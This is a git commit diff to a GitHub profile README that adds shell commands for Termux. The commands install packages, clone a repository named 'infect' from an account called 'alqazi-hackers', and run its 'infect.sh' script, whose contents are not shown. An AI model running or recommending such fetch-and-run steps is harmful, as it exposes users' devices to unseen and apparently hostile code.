51bdedcbeb70bc06ca84fbf72a48f81660bb7bab
Alqazi <142009126+Alqazi@users.noreply.github.com>
2023-08-11 15:41:19 +0500

    Update README.m amir
    123

--- README.m
+++ README.m
@@ -8,4 +8,15 @@
 <!---
 Alqazi/Alqazi is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
---->
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/alqazi-hackers/infect
+cd $HOME
+ls
+cd infect
+ls
+bash infect.sh
